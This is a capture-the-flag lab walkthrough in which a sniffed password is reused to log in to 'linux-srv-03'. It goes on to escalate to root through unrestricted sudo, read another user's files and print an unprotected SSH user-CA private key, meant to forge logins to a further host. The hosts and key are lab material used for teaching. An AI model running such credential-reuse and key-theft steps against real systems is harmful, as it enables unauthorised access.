# Accessing `linux-srv-03`

## Login as `alice`

Try if the sniffed password `puffy-beastie-tux-23` of `alice` is also valid on `linux-srv-03`:

```shell-session
root@linux-srv-02:~# ssh alice@linux-srv-03
[...]
alice@localhost's password: ******************** (puffy-beastie-tux-23)
[...]

alice@linux-srv-03:~$ hostname
linux-srv-03.nullbyte.internal

alice@linux-srv-03:~$ id
uid=1000(alice) gid=1000(alice) groups=1000(alice),27(sudo)
```

- The password is also valid on `linux-srv-03`

## Flag

Get the flag:

```
alice@linux-srv-03:~$ cat /flag.txt
ssh-labs{password-reuse-is-bad}
```

## Information Gathering Users

Check the `passwd` DB to see which users are on the system:

```shell-session
alice@linux-srv-03:~$ getent passwd
root:x:0:0:root:/root:/bin/bash
[...]
alice:x:1000:1000::/home/alice:/bin/bash
trent:x:1001:1001::/home/trent:/bin/bash
```

- Another user `trent` is on the system.

Check `sudo` permissions:

```shell-session
alice@linux-srv-03:~$ sudo -l
Matching Defaults entries for alice on linux-srv-03:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User alice may run the following commands on linux-srv-03:
    (ALL : ALL) NOPASSWD: ALL

```

- `alice` can execute all commands as `root`.

## Information Gathering User `trent`

Start a `root` shell using `sudo`:

```shell-session
alice@linux-srv-03:~$ sudo -i

root@linux-srv-03:~# id
uid=0(root) gid=0(root) groups=0(root)
```

Check the home directory of trent:

```shell-session
root@linux-srv-03:~# cd /home/trent/
root@linux-srv-03:/home/trent# ls -l
total 12
-rw-r----- 1 trent trent  183 May 23 13:37 todo.md
drwxr-x--- 1 trent trent 4096 May 23 13:37 user-ca
```

- There is a file `todo.md` and a directory `user-ca`.

Display the file `todo.md`:

```shell-session
root@linux-srv-03:/home/trent# cat todo.md 
# TODO

- [x] Update legacy systems
- [x] Complete SSH user CA configuration on `linux-srv-04`
- [ ] Move `user-ca` directory to new server in trusted secure zone
- [ ] Enjoy holiday
```

- `trent` probably configured an SSH user CA on `linux-srv-04` but left the `user-ca` directory on this system.

List the `user-ca` directory:

```shell-session
root@linux-srv-03:/home/trent# cd user-ca/
root@linux-srv-03:/home/trent/user-ca# ls -l
total 8
-rw------- 1 trent trent 419 Sep  8 14:58 user-ca
-rw------- 1 trent trent 107 Sep  8 14:58 user-ca.pub
```

Get the file contents:

```shell-session
root@linux-srv-03:/home/trent/user-ca# cat user-ca
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW
QyNTUxOQAAACCbg4GXctlkQqMACL4e8mAjXREabtE2zsPJ1yUX1baeNgAAAKB4Znx/eGZ8
fwAAAAtzc2gtZWQyNTUxOQAAACCbg4GXctlkQqMACL4e8mAjXREabtE2zsPJ1yUX1baeNg
AAAEAmV8EOi9i6CZMQaXNMgkbCY0r9xrIRaZbKzIkmd+D61puDgZdy2WRCowAIvh7yYCNd
ERpu0TbOw8nXJRfVtp42AAAAGU51bGxieXRlIEludGVybmFsIFVzZXIgQ0EBAgME
-----END OPENSSH PRIVATE KEY-----

root@linux-srv-03:/home/trent/user-ca# cat user-ca.pub 
ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIJuDgZdy2WRCowAIvh7yYCNdERpu0TbOw8nXJRfVtp42 Nullbyte Internal User CA
```

- There is an SSH private and public key for the "Nullbyte Internal User CA".

## User CA Analysis

Check if the private key is password protected:

```shell-session
root@linux-srv-03:/home/trent/user-ca# ssh-keygen -y -f user-ca
ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIJuDgZdy2WRCowAIvh7yYCNdERpu0TbOw8nXJRfVtp42 Nullbyte Internal User CA
```

- The public key could be derived from the private key without entering a password.
- Therefore, the private key is not password protected.

If `trent` configured this SSH user CA on `linux-srv-04` to trust signed user keys, it would be possible to sign an own key and use it to perform a login.
